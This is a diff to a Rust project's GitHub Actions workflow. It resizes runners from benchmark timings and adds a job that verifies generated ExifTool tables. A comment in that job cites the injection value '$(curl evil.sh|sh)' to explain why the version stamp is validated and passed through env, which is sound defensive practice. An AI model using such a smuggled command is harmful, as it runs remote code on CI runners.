@@ -39,10 +39,45 @@ env:
   CARGO_TERM_COLOR: always
   RUST_BACKTRACE: 1
 
+# Runner sizing (WarpBuild x64: 2x=2vCPU/7GB, 4x=4/16, 8x=8/32, 16x=16/64).
+# Sizes below were chosen from measured step timings, not job wall-clock --
+# a slow job is not necessarily a CPU-bound one. See the per-job notes.
+#
+# The Build & Test workload was swept across every size on a throwaway
+# benchmark workflow (removed once it had served its purpose; see PR #305 for
+# the harness). Seconds, cold cache, mean of the runs taken:
+#
+#         build   nextest   clippy   total   gain vs prev   cost vs prev
+#   2x      188      381       30      599        --             --
+#   4x      118      202       20      339      1.77x           2x
+#   8x       97      122       14      233      1.46x           2x
+#  16x       91       94       16      200      1.16x           2x
+#  32x       96       80       12      187      1.07x           2x
+#
+# 8x is both the knee and this repo's ceiling. Each doubling past it costs
+# 2x and returns well under 1.2x, because `cargo build --release` saturates
+# completely at 8 cores (97 -> 91 -> 96s is flat within noise) and it is the
+# largest single component. Only nextest keeps scaling, and not enough to
+# carry the total. The 16x/32x rows are kept as the evidence for stopping,
+# not as options.
+#
+# Measure before changing these; do not adjust by intuition. Reproducing the
+# harness is a few lines: a matrix over `runs-on:` labels running these same
+# commands with each phase as its own step, then read per-step seconds from
+# `gh api repos/{owner}/{repo}/actions/runs/{id}/jobs`.
+#
+# NOTE: "Lint & Audit" and "Build & Test" are required status checks. Changing
+# `runs-on` is safe because it does not change the check name; renaming or
+# splitting these jobs is NOT safe -- a required check that never reports
+# leaves every PR permanently unmergeable (see the paths-ignore note above).
 jobs:
   lint:
     name: Lint & Audit
-    runs-on: ubuntu-latest
+    # 4x, not 8x: of this job's ~4 minutes only ~51s is compile-bound
+    # (clippy --all-features). The dominant step is rustsec/audit-check at
+    # ~2m55s, which is network I/O against the advisory database and does not
+    # get faster with more cores.
+    runs-on: warp-ubuntu-latest-x64-4x
     timeout-minutes: 10
     steps:
       - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
@@ -63,7 +98,11 @@ jobs:
 
   test:
     name: Build & Test
-    runs-on: ubuntu-latest
+    # 8x: this job's ~12 minutes are almost entirely parallelisable work --
+    # cargo build --release (~2m51s, parallel across codegen units), nextest
+    # (~4m32s, test-level parallelism), the ExifTool comparison suite
+    # (~2m15s), the C FFI test (~1m16s) and doc tests (~56s).
+    runs-on: warp-ubuntu-latest-x64-8x
     timeout-minutes: 25
     steps:
       - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
@@ -110,8 +149,78 @@ jobs:
       - name: Integration tests (ExifTool comparison)
         run: cargo test --features exiftool-comparison
 
+  # The generated ExifTool tables are 100k+ lines that no reviewer reads in a
+  # diff, so their correctness rests entirely on verify.py -- which, until this
+  # job existed, nothing ever ran. A hand-edit of binary_tables.rs, or a
+  # regeneration against a different ExifTool, passed every other check.
+  #
+  # This re-parses the COMMITTED Rust and diffs it against a ground-truth dump
+  # taken independently from ExifTool's Perl symbol table, so it fails on a
+  # fabricated or drifted entry rather than on a mismatched formatting guess.
+  # No Rust build is needed: verify.py reads the .rs as text.
+  verify-tables:
+    name: Verify Generated Tables
+    # Stock runner on purpose: this is a tarball fetch plus a perl/python pass
+    # over one file, ~30s and entirely I/O-bound. The sizing measurements above
+    # apply to compile-bound jobs and buy nothing here.
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1
+      # The release is read from the artifact's own stamp rather than pinned
+      # here. A pin in this file would be a second source of truth, and when
+      # the two drifted the job would report hundreds of spurious differences
+      # that look like transcription errors instead of "wrong ExifTool".
+      # The stamp is read out of a file the pull request controls, so it is
+      # untrusted input. It is validated against a strict numeric pattern here
+      # and passed onward through env rather than `${{ }}` interpolation: a
+      # value like `$(curl evil.sh|sh)` expanded inside a run: block would be
+      # remote code execution on a fork PR.
+      - name: Resolve stamped ExifTool release
+        id: stamp
+        run: |
+          set -euo pipefail
+          V=$(sed -n 's/^pub const EXIFTOOL_VERSION: &str = "\(.*\)";$/\1/p' \
+                src/exiftool_tables/binary_tables.rs)
+          [ -n "$V" ] || { echo "::error::binary_tables.rs has no EXIFTOOL_VERSION stamp"; exit 1; }
+          case "$V" in
+            *[!0-9.]* | "" | .* | *.) echo "::error::refusing non-numeric ExifTool version '$V'"; exit 1 ;;
+          esac
+          echo "version=$V" >> "$GITHUB_OUTPUT"
+          echo "Tables declare ExifTool $V"
+      - name: Fetch that ExifTool source
+        env:
+          ET_VERSION: ${{ steps.stamp.outputs.version }}
+        run: |
+          set -euo pipefail
+          curl -sSL -o et.tar.gz \
+            "https://github.com/exiftool/exiftool/archive/refs/tags/${ET_VERSION}.tar.gz"
+          tar xzf et.tar.gz
+      - name: Verify committed tables against ExifTool
+        env:
+          ET_VERSION: ${{ steps.stamp.outputs.version }}
+        run: |
+          python3 tools/exiftool-tables/verify.py \
+            src/exiftool_tables/binary_tables.rs \
+            "exiftool-${ET_VERSION}/lib" \
+            --oracle tools/exiftool-tables/oracle.pl
+
   metrics:
     name: Benchmarks
+    # DELIBERATELY still ubuntu-latest -- do not "fix" this to a warp runner
+    # for consistency with the jobs above.
+    #
+    # This job publishes criterion results as a 90-day artifact, and
+    # deploy-docs.yml publishes the same benchmarks to the docs performance
+    # page. Timings are only comparable against timings measured on the same
+    # hardware, so moving the runner would silently break every historical
+    # comparison in exchange for no speedup worth having: criterion's
+    # measurement loop is single-threaded, and extra cores would only shorten
+    # the build that precedes it.
+    #
+    # The benchmark job in deploy-docs.yml stays on ubuntu-latest for the same
+    # reason. If these ever move, both must move together, in one commit, and
+    # the baseline discontinuity must be recorded in CHANGELOG.md.
     runs-on: ubuntu-latest
     timeout-minutes: 30
     if: github.event_name == 'push' && github.ref == 'refs/heads/main'
